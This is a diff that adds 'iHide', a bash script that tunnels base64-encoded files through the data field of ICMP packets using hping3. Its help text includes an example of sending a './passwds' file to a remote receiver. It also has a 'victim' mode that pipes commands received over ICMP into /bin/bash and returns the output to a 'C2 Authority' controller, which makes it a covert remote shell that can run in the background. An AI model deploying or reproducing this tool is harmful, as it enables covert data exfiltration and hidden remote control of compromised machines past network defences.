@@ -1,0 +1,216 @@
+#!/bin/bash
+OPTIND=1
+function cleanup {
+rm /tmp/temp -f
+kill -2 $(ps aux | grep hping3 | grep -v "grep hping3" | awk '{print $2}') > /dev/null
+exit
+}
+function icmpreceive {
+if [[ "$arg" != *-e* ]] || [[ "$arg" != *-s* ]] || [[ "$arg" != *-g* ]] || [[ "$arg" != *-i* ]] || [[ "$arg" != *-f* ]] || [[ "$arg" != *-r* ]]; then
+                echo "Not enough flags/switches"
+                echo "Run the -h command to view the help file"
+                echo "Required flags: e,s,g,i,f,r"
+                exit
+        else
+			hping3 $sflag --listen $signature -I $iface > /tmp/temp &
+			if tail -f -n 1 -c 5 /tmp/temp | grep -m 1 -o --line-buffered $eof; then
+			#kill -2 $(ps aux | grep hping3 | grep -v "grep hping3" | awk '{print $2}') > /dev/null
+			base64 -d /tmp/temp > $file
+			#cp /tmp/temp $file 
+			sed -i "s/[\x0].*//g" $file; sed -i "/$eof.*/q" $file;  sed -i "/$eof/d" $file
+			cleanup
+			fi
+fi
+}
+function icmptransfer {
+if [[ "$arg" != *-d* ]] || [[ "$arg" != *-s* ]] || [[ "$arg" != *-f* ]] || [[ "$arg" != *-z* ]] || [[ "$arg" != *-c* ]] || [[ "$arg" != *-t* ]]; then
+                echo "Not enough flags/switches"
+                echo "Run the -h command to view the help file"
+                echo "Required flags: d,s,f,z,c,t"
+                exit
+        else
+			eof_string=$(cat /dev/urandom | tr -dc '_A-Z-a-z-0-9' | head -c 8)
+			echo "EOF String: $eof_string  ; use with the -e flag w/receiver"
+			echo -n "Press any key to continue..."
+			read
+			base64 -w 60 $file > /tmp/temp
+			#cp $file /tmp/temp -f
+			echo $eof_string >> /tmp/temp
+			echo "Transferring data.  The receiver script will exit when finished."
+				if hping3 $dflag --icmp --sign $sflag --file /tmp/temp -d $size -u -C $code 2>&1 | grep -q -o --line-buffered -m 1 EOF; then
+				echo EOF Reached
+				cleanup
+				fi
+fi
+}
+function icmpcontrol {
+if [[ "$arg" != *-i* ]] || [[ "$arg" != *-j* ]] || [[ "$arg" != *-s* ]] || [[ "$arg" != *-d* ]] || [[ "$arg" != *-g* ]] || [[ "$arg" != *-c* ]] || [[ "$arg" != *-k* ]]; then
+	echo "Not enough flags/switches"
+	echo "Run the -h command to view the help file"
+	echo "Required flags: i,j,s,d,g,c,k"
+	exit
+else
+	hping3 -I $iface --listen $control_signature & hping3 $sflag --icmp --sign $signature --file ${VAR:-/dev/stdin} -d $dflag -C $code
+fi
+}
+function icmpvictim {
+if [[ "$arg" != *-i* ]] || [[ "$arg" != *-j* ]] || [[ "$arg" != *-s* ]] || [[ "$arg" != *-d* ]] || [[ "$arg" != *-g* ]] || [[ "$arg" != *-c* ]] || [[ "$arg" != *-m* ]]; then
+	echo "Not enough flags/switches"
+	echo "Run the -h command to view the help file"
+	echo "Required flags: i,j,s,d,g,c,m"
+	exit
+else
+	if [[ $background == true ]]; then
+		(hping3 -I $iface --listen $signature | /bin/bash 2>&1 | hping3 $sflag --icmp --sign $control_signature --file ${VAR:-/dev/stdin} -d $dflag -C $code &)
+	else
+		hping3 -I $iface --listen $signature | /bin/bash 2>&1 | hping3 $sflag --icmp --sign $control_signature --file ${VAR:-/dev/stdin} -d $dflag -C $code
+	fi
+fi
+}
+function helpmenu {
+echo "
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++iHide: ICMP File Transfer and Receiving++++++++++++++++++++
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+-h  -----  This help mess
+-l  -----  List the ICMP Types
+-v  -----  version/about
+-a  -----  auto cleanup
+*************Transmit Options*************
+-d  -----  Destination server IP
+-s  -----  Data stream signature
+-f  -----  Input file to send
+-z  -----  Data frame size
+-c  -----  ICMP code
+-t  -----  Transfer mode
+*************Receive Options*************
+-e  -----  EOF string, retrieved from transfer script
+-s  -----  The sender IP
+-g  -----  The transmitted data's signature
+-i  -----  Listening interface
+-f  -----  The filename to save the file as
+-r  -----  Receive mode
+**********Terminal Mode Options**********
+**************Experimental***************
+-i  -----  listening interface
+-j  -----  signature on controller
+-s  -----  IP of controller; IP of victim with -k flag
+-d  -----  data field size
+-g  -----  victim machine signature
+-c  -----  ICMP code
+-m  -----  This is the victim machine
+-k  -----  This is the controller (C2 Authority)
+**************Experimental***************
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+Examples:
+----|Transfer|----
+Required flags: d,s,f,z,c,t
+iHide -d 10.0.1.4 -s sign -f ./passwds -z 48 -c 11 -t
+----|Receiver (On 8.8.8.8 machine from previous ex.)|----
+Required flags: e,s,g,i,f,r
+iHide -e [eof string] -s 10.0.1.7 -g sign -i eth0 -f saveas.txt -r
+Note1: Prior to sending the traffic, you must have a receiver setup on the destination server
+to catch the ICMP packets.
+Note2: You may need to preceed the scripts with sudo.
+Note3: Use the generated string in the transfer script with the -e flag in the receiver script
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
+}
+function icmptypes {
+echo "
+ICMP TYPE NUMBERS
+The Internet Control Message Protocol (ICMP) has many messages that
+are identified by a "type" field.
+    Type 0 — Echo Reply
+    Type 1 — Unassigned
+    Type 2 — Unassigned
+    Type 3 — Destination Unreachable
+    Type 4 — Source Quench (Deprecated)
+    Type 5 — Redirect
+    Type 6 — Alternate Host Address (Deprecated)
+    Type 7 — Unassigned
+    Type 8 — Echo
+    Type 9 — Router Advertisement
+    Type 10 — Router Selection
+    Type 11 — Time Exceeded
+    Type 12 — Parameter Problem
+    Type 13 — Timestamp
+    Type 14 — Timestamp Reply
+    Type 15 — Information Request (Deprecated)
+    Type 16 — Information Reply (Deprecated)
+    Type 17 — Address Mask Request (Deprecated)
+    Type 18 — Address Mask Reply (Deprecated)
+    Type 19 — Reserved (for Security)
+    Types 20-29 — Reserved (for Robustness Experiment)
+    Type 30 — Traceroute (Deprecated)
+    Type 31 — Datagram Conversion Error (Deprecated)
+    Type 32 — Mobile Host Redirect (Deprecated)
+    Type 33 — IPv6 Where-Are-You (Deprecated)
+    Type 34 — IPv6 I-Am-Here (Deprecated)
+    Type 35 — Mobile Registration Request (Deprecated)
+    Type 36 — Mobile Registration Reply (Deprecated)
+    Types 37 — Domain Name Request (Deprecated)
+    Types 38 — Domain Name Reply (Deprecated)
+    Type 39 — SKIP (Deprecated)
+    Type 40 — Photuris
+    Type 41 — ICMP messages utilized by experimental mobility protocols such as Seamoby
+    Types 42-252 — Unassigned
+    Type 253 — RFC3692-style Experiment 1
+    Type 254 — RFC3692-style Experiment 2"
+ exit
+}
+function versioninfo {
+echo "
+*****************Scavenger*****************
+iHide is a script that leverages the optional data field to 
+transmit contents via the ICMP protocol.
+iHide v0.9.0 Copyright (C) 2015 
+This program comes with ABSOLUTELY NO WARRANTY;
+This is free software, and you are welcome to redistribute it
+under certain conditions
+Last Updated: 10/24/2015
+"
+exit
+}
+arg="$*"
+NUMARGS="$#"
+if [[ "$*" == *"-r"* ]] && [[ "$*" == *"-t"* ]] || [[ "$*" == *"-k"* ]] && [[ "$*" == *"-m"* ]]; then
+	echo "
+	=======================================================================
+	   ERROR: You can only select -t OR -r OR -k OR -m NOT a combination.
+	======================================================================="
+	echo "Try -h for the help menu"
+	exit
+fi
+if [ $NUMARGS -eq 0 ]; then
+  helpmenu
+fi
+while getopts "hvld:s:j:f:c:e:z:g:i:btrkm" option;
+do
+	case $option in	
+	h|\?) helpmenu
+	exit;;
+	a) cleanup;;
+	l) icmptypes;;
+    f)  if [[ "$OPTARG" = "-" ]]; then
+			file="${VAR:-/dev/stdin}"
+			stdin="true"
+			else
+			file="$OPTARG"
+		fi;;
+	d) dflag="$OPTARG";;
+	c) code="$OPTARG";;
+	j) control_signature="$OPTARG";;
+	g) signature="$OPTARG";;
+	s) sflag="$OPTARG";;
+	i) iface="$OPTARG";;
+	e) eof="$OPTARG";;
+	v) versioninfo;;
+	z) size="$OPTARG";;
+	b) background=true;;
+	t) icmptransfer;;
+	r) icmpreceive;;
+	k) icmpcontrol;;
+	m) icmpvictim;;
+	esac
+done
+shift $((OPTIND-1))
